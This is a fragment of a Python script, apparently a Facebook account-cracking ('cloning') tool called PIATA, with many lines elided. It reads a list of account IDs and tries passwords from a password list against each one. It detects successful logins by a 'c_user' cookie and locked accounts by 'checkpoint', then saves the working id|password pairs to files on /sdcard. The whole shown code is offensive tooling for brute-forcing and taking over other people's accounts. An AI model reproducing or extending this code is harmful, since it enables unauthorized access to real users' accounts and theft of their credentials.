...
print('[\033[1;31m∆\033[1;37m] PLAY PIRATE ....')
time.sleep(1.5)
print('[\033[1;31m∆\033[1;37m] IS RUNNING  ')
time.sleep(1.5)
os.system('git pull')
os.system('clear')
#print('[\033[1;32m•\033[1;37m]\033[1;32m✓\033[1;37m OK ')
time.sleep(2)
...
\033[1;31m----------------------------------------------\033[1;37m
 ...
 Facebook  : #####
 Tool Name : PIATA
 Version   : \033[1;31m0.1\033[1;37m
\033[1;31m----------------------------------------------\033[1;37m
""")
def linex():
...
#	print(f" [\033[1;32m2\033[1;37m] BD RANDOM CLONEING ")
	...
	if me in ["1", "01","11","A","a"]:
		clear()
		file = input(f' [\033[1;31m∆\033[1;37m] Put File Location \033[1;31m»\033[1;37m ')
		try:
			fo = open(file,'r').read().splitlines()
		except FileNotFoundError:
			print(f' [\033[1;31mX\033[1;37m] File location Not Found ')
			exit()
...
def m1(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;37m [PE] \033[1;36m•\033[1;37m %s \033[1;36m•\033[1;37m OK \033[1;36m•\033[1;37m [\033[1;32m%s\033[1;37m]'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Fof:
                                ...
                                print(f'\r\r\033[1;32m [PE\033[1;36m•\033[1;37m\033[1;32mOK] %s \033[1;36m•\033[1;37m\033[1;32m %s'%(ids,pas))
                                #cek_apk(session,coki)
                                #print(f'\033[1;36m [Cookie]\033[1;37m : '+coki)
                                open(f'/sdcard/PE•OK•M1.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Fof:
                                if 'y' in pcp:
                                        print(f'\r\r\x1b[38;5;208m [PE•CP] '+ids+' • '+pas+'\033[1;97m')
                                        open(f'/sdcard/PE•CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Fof:
                                ...
                                #cek_apk(session,coki)
                                #print(f'\033[1;36m [Cookie]\033[1;37m : '+coki)
                                open(f'/sdcard/PE•OK•M3.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Fof:
                                if 'y' in pcp:
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Fof:
                                ...
                                #cek_apk(session,coki)
                                #print(f'\033[1;36m [Cookie]\033[1;37m : '+coki)
                                open(f'/sdcard/PE•OK•M2.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Fof:
                                if 'y' in pcp:
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Fof:
                                ...
                                #cek_apk(session,coki)
                                #print(f'\033[1;36m [Cookie]\033[1;37m : '+coki)
                                open(f'/sdcard/PE•OK•M4.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Fof:
                                if 'y' in pcp:
